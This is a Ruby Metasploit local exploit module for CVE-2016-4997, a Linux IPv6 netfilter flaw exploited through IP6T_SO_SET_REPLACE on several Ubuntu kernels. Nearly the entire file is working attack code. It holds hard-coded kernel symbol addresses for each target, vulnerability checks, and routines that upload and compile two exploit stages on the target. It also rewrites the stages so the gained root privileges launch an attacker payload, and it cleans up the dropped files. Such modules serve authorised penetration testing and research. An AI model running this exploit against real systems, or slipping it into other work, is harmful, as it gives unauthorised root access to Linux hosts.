##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require "msf/core"

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
        'Name'           => 'Ubuntu IPv6 Table Privilege Escalation',
        'Description'    => %q{
          The IPv6 netfilter subsystem in the Linux kernel through 4.6.2 does not validate certain offset fields,
          which allows local users to escalade privileges via an IP6T_SO_SET_REPLACE compat setsockopt call with ip6_tables module loaded.
        },
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'h00die <mike@shorebreaksecurity.com>',                  # Module
            'Qian Zhang@MarvelTeam Qihoo 360 <tyrande000@gmail.com>' # Discovery
          ],
        'DisclosureDate' => 'Oct 10 2016',
        'Platform'       => [ 'linux'],
        'Arch'           => [ ARCH_X64],
        'SessionTypes'   => [ 'shell', 'meterpreter' ],
        'Targets'        =>
          [
            # this is the version.h file included in the edb exploit
            [ '4.2.0',    { 'PTMX_FOPS' =>           '0xffffffff81fcd580LL',
                            'TTY_RELEASE' =>         '0xffffffff81464c70LL',
                            'COMMIT_CREDS' =>        '0xffffffff810936d0LL',
                            'PREPARE_KERNEL_CRED' => '0xffffffff81093960LL',
                            'FOPS_RELEASE_OFFSET'	=>	(14 * 8)} ],
            [ '4.2.0-27', { 'PTMX_FOPS' =>           '0xffffffff81fd3740LL',
                            'TTY_RELEASE' =>         '0xffffffff814947a0LL',
                            'COMMIT_CREDS' =>        '0xffffffff81097370LL',
                            'PREPARE_KERNEL_CRED' => '0xffffffff81097660LL',
                            'FOPS_RELEASE_OFFSET'	=>	(14* 8)} ], # Ubuntu 14.04.5 LTS
            [ '4.4.0-21', { 'PTMX_FOPS' =>           '0xffffffff821de3e0LL',
                            'TTY_RELEASE' =>         '0xffffffff814e30b0LL',
                            'COMMIT_CREDS' =>        '0xffffffff810a21c0LL',
                            'PREPARE_KERNEL_CRED' => '0xffffffff810a25b0LL',
                            'FOPS_RELEASE_OFFSET'	=>	(13 * 8)} ], # Ubuntu 16.04 LTS x86-64
            [ '4.6.2', { 'PTMX_FOPS' =>              '0xffffffff81fe4ee0LL',
                            'TTY_RELEASE' =>         '0xffffffff814bff10LL',
                            'COMMIT_CREDS' =>        '0xffffffff8109fa90LL',
                            'PREPARE_KERNEL_CRED' => '0xffffffff8109fd70LL',
                            'FOPS_RELEASE_OFFSET'	=>	(13 * 8)} ]
          ],
        'DefaultOptions' => { 'WfsDelay' => 150, 'PrependFork' => true },
        'References'     =>
          [
            [ 'EDB', '40489'],
            [ 'CVE', '2016-4997']
          ]
      ))
    register_options(
      [
        OptString.new('WritableDir', [ true, 'A directory where we can write files (must not be mounted noexec)', '/tmp' ]),
        OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']])
      ], self.class)
  end

  def check
    def module_loaded?()
      vprint_status('Checking if ip_tables is loaded in kernel')
      iptables = read_file('/proc/modules')
      if iptables.include?('ip6_tables')
        vprint_good('ip6_tables.ko is loaded')
      else
        print_error('ip6_tables.ko is not loaded.  root needs to run ip6tables -L or similar command')
      end
      return iptables.include?('ip6_tables')
    end

    def has_prereq?()
      lib = cmd_exec('dpkg --get-selections | grep libc6-dev-i386')
      if lib.include?('install')
        vprint_good('libc6-dev-i386 is installed')
      else
        print_error('libc6-dev-i386 is not installed.  Compiling will fail.')
      end
      return lib.include?('install')
    end

    def kernel_vuln?()
      os_id = cmd_exec('grep ^ID= /etc/os-release')
      case os_id
      when 'ID=ubuntu'
        kernel = Gem::Version.new(cmd_exec('/bin/uname -r'))
        case kernel.release.to_s
        when '4.2.0'
          if kernel == Gem::Version.new('4.2.0-27-generic')
            vprint_good("Kernel #{kernel} is vulnerable")
            return true
          else
            print_error("Kernel #{kernel} is NOT vulnerable")
            return false
          end
        when '4.4.0'
          if kernel == Gem::Version.new('4.4.0-21-generic')
            vprint_good("Kernel #{kernel} is vulnerable")
            return true
          else
            print_error("Kernel #{kernel} is NOT vulnerable")
            return false
          end
        else
          print_error("Unexploitable Kernel: #{kernel}")
          return false
        end
      else
        print_error("Unknown OS: #{os_id}")
        return false
      end
    end

    if module_loaded?() && kernel_vuln?() && has_prereq?()
      return CheckCode::Appears
    else
      return CheckCode::Safe
    end
  end

  def exploit

    if check != CheckCode::Appears
      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')
    end

    stage1_filename = rand_text_alphanumeric(8)
    stage1_path = "#{datastore['WritableDir']}/#{stage1_filename}"
    stage2_filename = rand_text_alphanumeric(8)
    stage2_path = "#{datastore['WritableDir']}/#{stage2_filename}"
    payloadname = rand_text_alphanumeric(8)
    payload_path = "#{datastore['WritableDir']}/#{payloadname}"

    def has_prereqs?()
      gcc = cmd_exec('which gcc')
      if gcc.include?('gcc')
        vprint_good('gcc is installed')
      else
        print_error('gcc is not installed.  Compiling will fail.')
      end
      return gcc.include?('gcc')
    end

    compile = false
    if datastore['COMPILE'] == 'Auto' || datastore['COMPILE'] == 'True'
      if has_prereqs?()
        compile = true
        vprint_status('Live compiling exploit on system')
      else
        vprint_status('Dropping pre-compiled exploit on system')
      end
    end

    def upload_and_chmod(fname, fcontent, cleanup=true)
      print_status "Writing to #{fname} (#{fcontent.size} bytes)"
      rm_f fname
      write_file(fname, fcontent)
      cmd_exec("chmod +x #{fname}")
      if cleanup
        register_file_for_cleanup(fname)
      end
    end

    if compile
      begin
        # pretty much a direct copy of code from exploit-db.  Removed some comments and other minor things.
        path = ::File.join( Msf::Config.install_root, 'external', 'source', 'exploits', 'CVE-2016-4997', 'pwn.c')
        fd = ::File.open( path, "rb")
        stage1 = fd.read(fd.stat.size)
        fd.close

        # pretty much a direct copy of code from exploit-db.  Removed some comments, and other minor things.
        path = ::File.join( Msf::Config.install_root, 'external', 'source', 'exploits', 'CVE-2016-4997', 'enjoy.c')
        fd = ::File.open( path, "rb")
        stage2 = fd.read(fd.stat.size)
        fd.close
      rescue
        compile = false #hdm said external folder is optional and all module should run even if external is deleted.  If we fail to load, default to binaries
      end
    end


    if compile
      version = ''
      version << "#define PTMX_FOPS #{target['PTMX_FOPS']}\n"
      version << "#define TTY_RELEASE #{target['TTY_RELEASE']}\n"
      version << "#define COMMIT_CREDS #{target['COMMIT_CREDS']}\n"
      version << "#define PREPARE_KERNEL_CRED #{target['PREPARE_KERNEL_CRED']}\n"
      version << "#define FOPS_RELEASE_OFFSET #{target['FOPS_RELEASE_OFFSET']}\n"

      stage1.gsub!(/execl\(".\/enjoy", "", NULL\);/,
                   "execl(\"#{stage2_path}\",\"#{stage2_filename}\",NULL);")
      stage1.gsub!(/#include "version\.h"/,
                   version)
      stage2.gsub!(/#include "version\.h"/,
                   version)
      stage2.gsub!(/execl\("\/bin\/bash", "-sh", NULL\);/,
                          "execl(\"#{payload_path}\",\"#{payloadname}\",NULL);")
      upload_and_chmod("#{stage1_path}.c", stage1)
      vprint_status("Compiling #{stage1_path}.c")
      cmd_exec("gcc -m32 -o #{stage1_path} #{stage1_path}.c") # compile stage1 file
      register_file_for_cleanup("#{stage1_path}")

      upload_and_chmod("#{stage2_path}.c", stage2)
      vprint_status("Compiling #{stage2_path}.c")
      cmd_exec("gcc -m64 -o #{stage2_path} #{stage2_path}.c") # compile stage2 file
      register_file_for_cleanup("#{stage2_path}")
    else
      stage1_filename = 'cxvXS1Et'
      stage1_path = "#{datastore['WritableDir']}/#{stage1_filename}"
      stage2_filename = 'euPEmXEw'
      stage2_path = "#{datastore['WritableDir']}/#{stage2_filename}"

      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', 'CVE-2016-4997-pwn.out')
      fd = ::File.open( path, "rb")
      stage1 = fd.read(fd.stat.size)
      fd.close
      upload_and_chmod(stage1_path, stage1)

      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', 'CVE-2016-4997-enjoy.out')
      fd = ::File.open( path, "rb")
      stage2 = fd.read(fd.stat.size)
      fd.close
      upload_and_chmod(stage2_path, stage2)

      # overwrite with the hardcoded variable names in the compiled versions
      payload_filename = 'tlbHJ3An'
      payload_path = '/tmp/tlbHJ3An'
    end

    upload_and_chmod(payload_path, generate_payload_exe)
    vprint_status('Exploiting... This may take around 2min to complete.')
    output = cmd_exec(stage1_path)
    output.each_line { |line| vprint_status(line.chomp) }
  end
end
